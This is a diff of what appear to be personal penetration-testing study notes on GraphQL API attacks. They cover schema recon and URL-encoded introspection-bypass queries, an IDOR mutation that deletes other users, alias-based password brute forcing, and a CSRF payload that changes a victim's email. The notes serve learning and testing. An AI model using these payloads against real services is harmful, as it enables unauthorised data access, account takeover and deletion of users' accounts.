@@ -1,3 +1,5 @@
+#GraphQL #Completed 
+
 ![[GraphQL APIs.jpg]]
 # Recon
 
@@ -205,6 +207,8 @@ Suggestions can be used to gather info on the structure. They're a feature of Ap
 Try to run an introspection query in Repeater by right-clicking and choosing "Set introspection query". Search for any hidden values or fields that are not sent by default and modify the original GraphQL query to include that field - it may include sensitive information.
 
 If there is a ton of schema information, right click the request and "Save GraphQL queries to site map" to better understand the individual queries. If any query allows sending of a guessable ID (e.g. id=1), try fuzzing the value to potentially extract sensitive information.
+
+Additionally, try inserting potentially hidden fields such as "postPassword" to the query to potentially extract sensitive information hidden from view but part of the object.
 # Bypass Introspection Defenses
 
 If introspection is disabled, insert a special character after the `__schema` keyword. Attempt to bypass the regex of excluding `__schema` in queries via spaces, newlines and commas since they are ignored by GraphQL but not by flawed regex:
@@ -227,13 +231,29 @@ Attempt to run a probe over an alternative method as well such as GET or POST re
 If the GraphQL endpoint is hidden, attempt to find it using various common endpoints (/api, /graphql, etc..). If found, send a universal query:
 
 ```json
-query=query{__typename}
+/api?query=query{__typename}
 ```
 
 >[!info]
 >Try sending it as both a GET request (query=.....) and a POST request.
 
-Attempt various endpoint bypasses such as newlines (%0A). spaces (%20) or commas (%2c). 
+Attempt various endpoint bypasses such as newlines (%0A). spaces (%20) or commas (%2c). Try to overcome the introspection defenses via various URL encoded queries such as:
+
+```bash
+/api?query=query+IntrospectionQuery+%7B%0A++__schema+%7B%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
+```
+
+Or the following which uses a newline:
+
+```bash
+/api?query=query+IntrospectionQuery+%7B%0D%0A++__schema%0a+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
+```
+
+Look at various queries in the site map and find interesting queries like getUser or deleteOrganizationUser and attempt to perform actions with different user IDs to grab passwords or delete users such as:
+
+```bash
+/api?query=mutation+%7B%0A%09deleteOrganizationUser%28input%3A%7Bid%3A+3%7D%29+%7B%0A%09%09user+%7B%0A%09%09%09id%0A%09%09%7D%0A%09%7D%0A%7D
+```
 # Bypass Rate Limiting
 
 Aliases allow you to bypass multiple properties with the same name restriction by naming the properties you want to return. Aliases can return multiple instances of the same type of object in one request. Aliases can brute force a GraphQL endpoint.
@@ -304,6 +324,8 @@ final_query = "\n".join(graphql_queries)
 # Output the generated GraphQL query string
 print(final_query)
 ```
+
+Attempt to send all login credentials at once using mutations to brute force the password.
 # GraphQL CSRF
 
 GraphQL can allow a CSRF attack to take place whereby an attacker creates an exploit that causes a victim's browser to send a malicious query as the victim. 
@@ -329,7 +351,7 @@ As an example, a standard email change request may be:
 }
 ```
 
-After changing the request method, add it back as non-JSON data:
+Try re-submitting with a new email to ensure a session token can be reused to send many requests. After changing the request method, add it back as non-JSON data:
 
 ```json
 query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D
